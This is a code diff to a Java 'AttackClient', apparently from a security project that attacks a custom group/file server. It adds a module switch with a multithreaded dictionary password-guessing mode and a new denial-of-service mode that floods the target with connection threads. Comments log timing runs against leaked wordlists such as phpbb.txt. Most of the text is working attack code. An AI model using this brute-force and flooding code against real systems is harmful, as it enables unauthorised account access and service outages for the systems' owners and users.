@@ -31,60 +31,69 @@ import javax.crypto.Cipher;
 public class AttackClient {
 
 	public static void main(String[] args) {
-		// Usage | AttackClient <IP> <PORT> <USERNAME> <list> <threads>
+		// Usage | AttackClient <MODULE> <THREADS> <IP> <PORT> ?<USERNAME> ?<LIST>
 		AttackClient ac = new AttackClient();
 
 		if (args.length < 4) {
 			System.out.println(args.length);
 			return;
 		} else {
-			String ip = args[0];
-			int port = Integer.parseInt(args[1]);
-			String username = args[2];
-			String list = args[3];
-			int threads = Integer.parseInt(args[4]); 
+            String module = args[0].toUpperCase();
+            int threads = Integer.parseInt(args[1]);
+
+			String ip = args[2];
+			int port = Integer.parseInt(args[3]);
 
             AttackClientThread thread = null;
 
             OffsetDateTime start = OffsetDateTime.now();
 
-			try {
-				File dictionary = new File(list);
-				Scanner dictRead = new Scanner(dictionary);
+            if (module.equals("DICT")) {
+                String username = args[4];
+                String list = args[5];
 
-				int i = 0;
-				while (dictRead.hasNextLine()) {
-					String tem=dictRead.nextLine();
-					i++;
-				}
-				dictRead.close();
+                try {
+                    File dictionary = new File(list);
+                    Scanner dictRead = new Scanner(dictionary);
 
-				dictRead = new Scanner(dictionary);
-				String[] pwStore = new String[i+1];
-				ArrayList<AttackClientThread> arrThreads=new ArrayList<AttackClientThread>();
+                    int i = 0;
+                    while (dictRead.hasNextLine()) {
+                        String tem=dictRead.nextLine();
+                        i++;
+                    }
+                    dictRead.close();
 
-				int z=0; int ct=0;
-				while (dictRead.hasNextLine()) {
-					String pw = dictRead.nextLine();
-					pwStore[z]=pw;
-					if (z%(i/threads)==0 && z!=0) {
-						ct++;
-						thread = new AttackClientThread(ip, port, username, Arrays.copyOfRange(pwStore, z-(i/threads), z));
-						System.out.println("Trying "+z+" passwords");
-            			thread.start();
-            			arrThreads.add(thread);
-					}
-					z++;
-				}
+                    dictRead = new Scanner(dictionary);
+                    String[] pwStore = new String[i+1];
+                    ArrayList<AttackClientThread> arrThreads=new ArrayList<AttackClientThread>();
 
-				for (int t = 0; t<arrThreads.size(); t++) {
-					arrThreads.get(t).join();
-				}
-					// System.out.println(ct);
-					// System.out.println(i);
-			} catch (Exception e) {
-				System.out.println(e);
-			}
+                    int z=0; int ct=0;
+                    while (dictRead.hasNextLine()) {
+                        String pw = dictRead.nextLine();
+                        pwStore[z]=pw;
+                        if (z%(i/threads)==0 && z!=0) {
+                            thread = new AttackClientThread(ip, port, module, username, Arrays.copyOfRange(pwStore, z-(i/threads), z));
+                            System.out.println("Trying "+z+" passwords");
+                            thread.start();
+                            arrThreads.add(thread);
+                        }
+                        z++;
+                    }
+
+                    for (int t = 0; t<arrThreads.size(); t++) {
+                        arrThreads.get(t).join();
+                    }
+                } catch (Exception e) {
+                    System.out.println(e);
+                }
+            } else if (module.equals("DOS")) {
+                ArrayList<AttackClientThread> arrThreads=new ArrayList<AttackClientThread>();
+                for (int i = 0; i < threads; i++) {
+                    thread = new AttackClientThread(ip, port, module);
+                    thread.start();
+                    arrThreads.add(thread);
+                }
+            }
 
 			OffsetDateTime end = OffsetDateTime.now();
 
@@ -112,17 +121,6 @@ public class AttackClient {
             // STARTED AT:     2020-11-20T09:01:21.466-05:00
             // ENDED AT:       2020-11-20T09:03:01.258-05:00
             // Total:          1 minutes    40 seconds
-
-			// PasswordPro.txt - 29.5MB
-            // Personal Machine
-			// STARTED AT:     2020-11-17T20:37:49.740-05:00
-			// ENDED AT:       2020-11-17T20:40:25.049-05:00
-			// Total:		   2 minutes	36 seconds
-
-            // Linux cluster
-            // 
-            // 
-            // Total:          7 minutes    54 seconds
 
 			// phpbb.txt - 1.5MB
             // Personal Machine
@@ -152,9 +150,9 @@ public class AttackClient {
 			// Total:		   24 minutes	36 seconds
 
             // Linux cluster
-            // STARTED AT:     2020-11-19T19:35:22.174-05:00
-            // ENDED AT:       2020-11-19T22:35:22.647-05:00
-            // Total:          3 hours
+            // 
+            // 
+            // Total:          > 3 hours
 			
 		}
 
@@ -176,8 +174,9 @@ class AttackClientThread extends Thread{
     private String ip;
     private int port;
     private String username;
+    private String module;
 
-    public AttackClientThread(String _ip, int _port, String _username, String[] _pwStore) {
+    public AttackClientThread(String _ip, int _port, String _module, String _username, String[] _pwStore) {
         Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());
 
         g_cli = new AttackGroup(false);
@@ -188,23 +187,41 @@ class AttackClientThread extends Thread{
         ip = _ip;
 		port = _port;
 		username = _username;
+        module=_module;
+    }
+
+    public AttackClientThread(String _ip, int _port, String _module) {
+        Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());
+
+        g_cli = new AttackGroup(false);
+        f_cli = new FileClient();
+        rsa_key = g_cli.generateRSA(); // could also be g_cli
+
+        ip = _ip;
+        port = _port;
+        module=_module;
+
     }
 
     public void run() {
-		StringTokenizer cmds1 = new StringTokenizer("connect group "+ip+" "+port);
-		mapCommand(cmds1);
-
-		for (int i = 0; i<pwStore.length; i++){
-			StringTokenizer cmds2 = new StringTokenizer(""+username+" "+pwStore[i]);
-			if(getToken(cmds2)) {
-				System.out.println("Worked on ... "+pwStore[i]);
-				break;
-			}
-			if(i%1000==0&&i!=0)
-				System.out.println(Thread.currentThread().getId()+" | Done "+i);
-		}
-		System.out.println(Thread.currentThread().getId()+" | Finished");
-		mapCommand(new StringTokenizer("exit"));
+        if (module.equals("DICT")){
+            StringTokenizer cmds1 = new StringTokenizer("connect group "+ip+" "+port);
+            mapCommand(cmds1);
+    
+            for (int i = 0; i<pwStore.length; i++){
+                StringTokenizer cmds2 = new StringTokenizer(""+username+" "+pwStore[i]);
+                if(getToken(cmds2)) {
+                    System.out.println("Worked on ... "+pwStore[i]);
+                    break;
+                }
+                if(i%1000==0&&i!=0)
+                    System.out.println(Thread.currentThread().getId()+" | Done "+i);
+            }
+            System.out.println(Thread.currentThread().getId()+" | Finished");
+            mapCommand(new StringTokenizer("exit"));
+        } else if (module.equals("DOS")) {
+            mapCommand(new StringTokenizer("connect group "+ip+" "+port));
+        }
     }
 
     public AttackClientThread(boolean _gui) {
